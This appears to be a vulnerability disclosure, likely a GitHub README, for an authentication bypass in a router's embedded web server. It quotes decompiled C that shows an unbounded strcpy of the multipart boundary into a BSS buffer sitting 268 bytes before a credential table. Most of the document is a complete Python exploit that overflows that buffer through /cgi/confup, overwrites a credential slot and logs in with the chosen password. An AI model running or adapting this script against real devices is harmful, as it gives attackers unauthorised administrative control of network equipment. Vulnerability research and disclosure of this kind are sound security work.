# full research and PoC of an auth bypass exploit

in the http parsing function `sub_40402C`, in line 268, the boundary field is parsed into a bss field:
```c
    v37 = strstr(v34, "boundary=");
    v38 = v37 + 9;
    if ( !v37 )
      goto LABEL_128;
    do
    {
      while ( 1 )
      {
        v39 = *v38;
        if ( v39 != 32 )
          break;
        ++v38;
      }
      ++v38;
    }
    while ( v39 == 9 );
    v40 = v38 - 1;
    v41 = strchr(v40, 59);
    if ( v41 )
      *v41 = 0;
    strcpy(&byte_4331A4, v40);
```
as you can see theres an unlimited write into `byte_4331A4`. in order to exploit it ive researched down and searched for values stored in the bss under the given value.

wandering into the function `sub_404DF8` which is called from a section aimed to parse and auth the cookie field around line 350:
```c
      if ( !strncmp(v43, "Basic ", 6u) )
      {
        byte_433A40 = 1;
        sub_404DF8(v43 + 6, (int)s);
      }
```
looking into the function:
```c
int __fastcall sub_404DF8(char *s2, int a2)
{
  const char *v4; // $s1
  int v5; // $s0
  const char *v6; // $a0

  v4 = (const char *)&unk_4332B0;
  v5 = 0;
  v6 = (const char *)&unk_4332B0;
  while ( 1 )
  {
    v4 += 45;
    if ( !strcmp(v6, s2) )
      break;
    ++v5;
    v6 = v4;
    if ( v5 == 4 )
      return *(_DWORD *)(a2 + 52);
  }
  *(_DWORD *)(a2 + 52) = v5;
  return *(_DWORD *)(a2 + 52);
}
```
it checks `unk_4332B0` against the cookie, per every entry. as it seems there are 4 diffrent cred tables spaces 45 bytes from eachother. probably a 45 byte struct inserted into memory by some of the setup functions. the important part is that `unk_4332B0` is under `byte_4331A4`, which can be overflown. giving us a way to overwrite the cred table:


```py
import requests
import base64

def set_creds() -> bytes:
    return b"PoC"


TARGET = "192.168.1.1"
PORT = 80
BASE = f"http://{TARGET}:{PORT}"
TIMEOUT = 5

CRED_OVERWRITE = set_creds()
SEPERATOR = b":"
PASSWORD = base64.b64encode(CRED_OVERWRITE + SEPERATOR + CRED_OVERWRITE)


def craft_payload() -> bytes:
    '''
    overflow vulnrable strcpy()
    .text:004046FC  # 307: strcpy(&byte_4331A4, v40);
    to .bss:0x4331A4 byte_4331A4 arbitrarly in the
    BSS segment to reach the cred table which is 268 bytes away at .bss:0x004332B0 unk_4332B0
    '''
    boundary = b"0" * 268  # reach to slot 0
    '''
    the authentication function in .text:0x404DF8 sub_404DF8
    immideatly skips the first cred table slot index 0 (which its is size 45) : .text:00404E38  # 12:     v4 += 45;
    '''
    boundary += b"1" * 45  # skip to slot 1 since its unread
    '''
    the cred table saves the credentials in this format: base64(username):base64(password) 
    (proven by the debugger), so thats to change it we use the same format with the aribtrary password
    '''
    boundary += PASSWORD  # change the password
    return boundary

def request_auth() -> None:
    headers = {
        "Cookie": f"Authorization=Basic {PASSWORD.decode()}",
        "Referer": f"http://{TARGET}/",
    }
    r = requests.get(BASE + "/", headers=headers, timeout=TIMEOUT)

    is_login_page = "login" in r.text
    print(f"[?] is login page? {is_login_page}")
    if not is_login_page:
        print("[V] BYPASS SUCSSESS")

def exploit() -> None:
    print(f"sending exploit..")
    payload = craft_payload()
    headers = {"Content-Type": f"multipart/form-data; boundary={payload.decode()}"}
    requests.post(BASE + "/cgi/confup", headers=headers, data=b"", timeout=TIMEOUT)

    print("exploit sent. trying to bypass the login page with cookies set as the arbitrary password")

def main() -> None:
    print("\n[+]trying to acsess admin before exploit:")
    request_auth()

    print("\n[+] sending exploit")
    exploit()

    print("\n[+] trying to acsess admin after exploit")
    request_auth()


if __name__ == "__main__":
    main()

```

POC VIDEO:

https://github.com/user-attachments/assets/bddee845-5c26-43a5-8b50-cefc5687141f



